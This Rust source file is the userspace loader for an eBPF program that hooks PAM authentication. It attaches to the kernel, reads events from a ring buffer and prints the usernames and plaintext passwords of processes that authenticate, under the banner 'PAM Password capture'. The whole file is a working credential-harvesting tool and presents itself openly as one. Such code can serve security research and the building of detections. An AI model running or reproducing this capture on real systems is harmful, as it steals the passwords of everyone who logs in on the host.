mod bpf;
use std::{ffi::CStr, mem::MaybeUninit, time::Duration};

use bpf::*;

use anyhow::Result;
use libbpf_rs::{
    RingBufferBuilder,
    skel::{OpenSkel, Skel, SkelBuilder},
};
use plain::{Plain, copy_from_bytes};

unsafe impl Plain for types::event {}

fn handle_event(data: &[u8]) -> i32 {
    let mut evt = types::event::default();
    println!("----- PAM Password capture -----");
    match copy_from_bytes(&mut evt, data) {
        Ok(_) => {
            let pid = evt.pid;
            let temp = unsafe { CStr::from_ptr(evt.comm.as_ptr() as *const i8) };
            let comm = temp.to_str().unwrap_or("UNKNOWN");
            if evt.username[0] == ('\0' as i8) {
                let temp = unsafe { CStr::from_ptr(evt.password.as_ptr() as *const i8) };
                let passwd = temp.to_str().unwrap_or("UNKNOWN");
                println!("PID {}, COMM: {}, Password: {}", pid, comm, passwd);
            } else {
                let temp = unsafe { CStr::from_ptr(evt.username.as_ptr() as *const i8) };
                let username = temp.to_str().unwrap_or("UNKNOWN");
                println!("PID {}, COMM: {}, Username : {}", pid, comm, username);
            }
            0
        }
        Err(e) => {
            eprintln!("error happen in handler: {:?}", e);
            -1
        }
    }
}

fn main() -> Result<()> {
    let skel_builder = PamAuthSkelBuilder::default();
    let mut open_ops = MaybeUninit::uninit();
    let open_skel = skel_builder.open(&mut open_ops)?;
    // loading bpf file
    let mut skel = open_skel.load()?;
    skel.attach()?;
    let mut buf_builder = RingBufferBuilder::new();
    buf_builder.add(&skel.maps.events, handle_event)?;
    let buf = buf_builder.build()?;
    println!("Successfully attach program to kernel");
    loop {
        buf.poll(Duration::from_millis(100))?;
    }
}
